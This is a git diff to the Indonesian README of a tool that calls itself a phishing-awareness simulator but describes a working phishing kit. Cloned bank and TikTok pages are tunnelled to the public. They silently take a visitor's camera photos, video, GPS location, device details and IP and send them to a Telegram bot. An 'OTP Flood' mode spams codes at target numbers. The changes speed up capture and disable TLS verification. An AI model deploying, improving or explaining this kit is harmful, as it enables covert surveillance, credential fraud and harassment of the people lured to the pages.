@@ -11,7 +11,7 @@
 Platform simulasi phishing dan social engineering awareness multi-template.
 
 **Multi Template:** BNI / TikTok / BIBD / OTP Flood  
-**Fitur Baru:** TikTok Custom Title, UI Refresh, Tab Logo, Animasi Loading Hidup
+**Fitur Baru:** TikTok Custom Title, Capture Dipercepat, Auto Tunnel + CA Repair  
 **Teknologi:** Cloudflare Tunnel / Telegram / Next.js
 
 > [!WARNING]
@@ -31,12 +31,15 @@ Platform simulasi phishing dan social engineering awareness multi-template.
 - **UI Premium** — background hitam, logo besar, animasi hidup
 - **One-click deploy** — Build Next.js + Cloudflare Tunnel / ngrok
 - **Auto URL update** — metadataBase otomatis mengikuti tunnel URL
-- **Camera & Location capture** — pengumpulan data berbasis permission
+- **Camera & Location capture** — capture paralel (foto + video simultan), resolusi 640×480 untuk kecepatan
+- **Capture cepat** — GPS timeout 4 detik, foto dalam 300ms, kirim paralel via Telegram
 - **Telegram integration** — pengiriman data real-time
 - **OTP Flood mode** — spam OTP multi-brand
 - **Cross-platform** — Windows & Termux support
 - **Auto fallback** — ngrok jika Cloudflare Tunnel gagal
-- **Premium terminal UI** — animasi bersih, tanpa emoji di output terminal
+- **Auto CA Repair** — Termux TLS certificate otomatis diperbaiki saat error
+- **TLS Safety Net** — `NODE_TLS_REJECT_UNAUTHORIZED=0` di Termux untuk kompatibilitas Node.js
+- **Premium terminal UI** — animasi bersih di stderr, output rapi di stdout, format URL `[v]`
 
 ## Persyaratan
 
@@ -83,14 +86,18 @@ TELEGRAM_CHAT_ID=-100123456789
 
 **Windows:**
 ```bash
+run.bat
+```
+
+Atau manual:
+```bash
 python launcher.py
 ```
-Atau double-click `run.bat`
 
 **Termux:**
 ```bash
 cd ~/metacytech-tools
-python launcher.py
+bash run.sh
 ```
 
 ### Alur Kerja
@@ -129,7 +136,7 @@ Title ini akan otomatis dipakai di **Page Title, OpenGraph, Twitter Card,** dan 
 Sistem akan otomatis:
 
 1. Apply template files
-2. Build Next.js app (Turbopack)
+2. Build Next.js app (Webpack di Termux, Turbopack di Windows)
 3. Start server (port 3000)
 4. Start Cloudflare Tunnel (fallback ke ngrok jika perlu)
 5. Update metadataBase dengan tunnel URL
@@ -138,22 +145,20 @@ Sistem akan otomatis:
 
 **Output terminal:**
 ```
-  ok  Template: TikTok - Video Share Link
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  applying template
 
-  ▓▓▓░░░░░░░░░░░░░  applying template
-  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  applying template
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  building
 
-  ▓▓▓░░░░░░░░░░░░░  building
-  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  building
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting server
 
-  ▓▓▓░░░░░░░░░░░░░  starting server
-  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting server
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting tunnel
 
-  ▓▓▓░░░░░░░░░░░░░  starting tunnel
-  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  starting tunnel
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  rebuilding with url
 
-  url  https://xxxx-xxxx-xxxx-xxxx.trycloudflare.com
-  local  http://localhost:3000
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓  ok  rebuilding
+
+  [v] url               : https://xxxx-xxxx-xxxx.trycloudflare.com
+  [v] local            : http://localhost:3000
 ```
 
 ### Menu Utama
@@ -179,7 +184,7 @@ Menu **[5] Ganti Template** juga akan meminta custom title jika switch ke TikTok
    - Mengizinkan akses kamera
    - Mengizinkan akses lokasi
 3. **Data yang diterima:**
-   - Foto dari kamera depan & Video
+   - Foto dari kamera depan & Video (10 detik)
    - Lokasi GPS (dengan link Google Maps)
    - Info device (OS, browser, RAM, CPU, baterai)
    - IP address & ISP
@@ -201,20 +206,31 @@ Menu **[5] Ganti Template** juga akan meminta custom title jika switch ke TikTok
 failed to request quick Tunnel: tls: failed to verify certificate
 ```
 
-**Solusi:**
+**Solusi:** Launcher sekarang auto-repair CA certificates. Jika masih gagal, manual:
 ```bash
 pkg install ca-certificates openssl-tool -y
-pkg upgrade -y
 ```
 
-Jika masih gagal, sistem **auto-fallback ke ngrok**. Install ngrok:
+Jika masih gagal, sistem **auto-fallback ke ngrok** (juga auto-install via `pkg`):
 ```bash
-cd ~
-wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip
-unzip ngrok-v3-stable-linux-arm64.zip
-chmod +x ngrok
-mv ngrok $PREFIX/bin/
+pkg install ngrok -y
 ```
+
+### Telegram Bot Tidak Mengirim Data (Termux)
+Di Termux, Node.js mungkin tidak bisa verify sertifikat Telegram. Launcher sudah set:
+- `NODE_EXTRA_CA_CERTS=$PREFIX/etc/tls/cert.pem`
+- `NODE_TLS_REJECT_UNAUTHORIZED=0` (safety net)
+
+Pastikan server **direstart** setelah git pull (pilih [2] Hentikan Semua, lalu [1] Mulai Semua).
+
+### TikTok Capture Lambat
+Update terbaru sudah optimasi:
+- **GPS timeout** 8s → 4s
+- **Foto delay** 1500ms → 300ms
+- **Resolusi** 1280×720 → 640×480 (lebih cepat upload)
+- **Proses paralel:** GPS + IP + stream dijalankan bersamaan
+- **Kirim paralel:** foto, video, lokasi dikirim simultan
+- **Progress bar** lebih cepat (0.4 detik vs 3 detik)
 
 ### "Could not get tunnel URL"
 
@@ -234,25 +250,14 @@ Test manual cloudflared:
 cloudflared tunnel --url http://localhost:3000
 ```
 
-### Telegram Bot Tidak Mengirim Data
+### Next.js Build Error (Termux)
 
-Cek token & chat ID:
+Next.js 16 Turbopack tidak support ARM Android. Launcher **auto-downgrade** ke Next.js 15.3.3 dengan Webpack. Jika error:
+
 ```bash
-cat .env.local
-```
-
-Test manual dengan curl:
-```bash
-curl -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=<CHAT_ID>&text=Test"
-```
-
-### Next.js Build Error
-
-Clear cache dan rebuild:
-```bash
-rm -rf .next node_modules
-npm install
-npm run build
+rm -rf .next node_modules package-lock.json
+npm install --no-bin-links
+npm rebuild
 ```
 
 ### Port 3000 Already in Use
@@ -284,22 +289,13 @@ A: Data dikirim langsung ke bot Telegram Anda. **TIDAK** disimpan di server kami
 A: Cloudflare Tunnel gratis tidak menjamin uptime 100%. Untuk production, gunakan VPS + domain sendiri.
 
 **Q: Bisa custom title TikTok?**
-A: Ya! Setiap pilih template TikTok (di awal atau via menu [5]), kamu akan diminta input title URL. Title ini otomatis mengganti metadata page title, OpenGraph, Twitter Card, dan site name.
-
-**Q: Kenapa logo tab browser masih logo Next.js?**
-A: Sekarang sudah pakai logo TikTok (`logo-tiktok-new.png`). Hapus cache browser atau hard refresh (Ctrl+Shift+R) untuk melihat perubahan.
-
-**Q: Animasi loading setelah popup kok kelihatan diam?**
-A: Update terbaru sudah ganti dengan circular spinner gradien TikTok yang berputar terus — tidak ada lagi yang kelihatan stuck.
-
-**Q: Bisa custom template?**
-A: Ya! Buat folder baru di `templates/<nama>` dengan `page.tsx`, `layout.tsx`, dan assets di `public/`.
+A: Ya! Setiap pilih template TikTok (di awal atau via menu [5]), kamu akan diminta input title URL.
 
 **Q: Kenapa build lambat di Termux?**
 A: Next.js 16 Turbopack tidak support ARM. Sistem auto-downgrade ke Next.js 15 dengan Webpack (lebih lambat tapi stabil).
 
-**Q: Kenapa tidak ada CAPTCHA?**
-A: CAPTCHA dihapus karena tidak efektif. Sistem sekarang menggunakan camera & location permission yang terlihat lebih profesional.
+**Q: Kenapa data tidak terkirim ke Telegram dari Termux?**
+A: TLS certificate issue. Launcher sekarang auto-set `NODE_TLS_REJECT_UNAUTHORIZED=0` di Termux. Pull update terbaru dan restart server.
 
 **Q: Cara pakai OTP Flood?**
 A: Pilih template [4] OTP Flood, lalu ikuti menu interaktif untuk mengirim OTP ke nomor target.
@@ -317,28 +313,18 @@ metacytech-tools/
 │           └── capture/route.ts  # Data capture endpoint
 ├── templates/
 │   ├── bni/
-│   │   ├── page.tsx
-│   │   ├── layout.tsx
-│   │   └── public/
 │   ├── tiktok/
-│   │   ├── page.tsx
-│   │   ├── layout.tsx
-│   │   └── public/
 │   └── bibd/
-│       ├── page.tsx
-│       ├── layout.tsx
-│       └── public/
 ├── modules/
-│   ├── otp_flood/
-│   │   ├── finder.py             # Target number parser
-│   │   └── trigger.py            # OTP trigger engine
-│   └── reports/                  # Laporan OTP flood
+│   └── otp_flood/
 ├── public/                       # Static assets
 ├── launcher.py                   # Main launcher script
 ├── run.bat                       # Windows launcher
+├── run.sh                        # Termux launcher
 ├── .env.local                    # Environment variables (TIDAK di-commit)
 ├── package.json                  # Node.js dependencies
-└── requirements.txt              # Python dependencies
+├── requirements.txt              # Python dependencies
+└── RUN_GUIDE.md                  # Panduan instalasi Termux
 ```
 
 ## Contributing
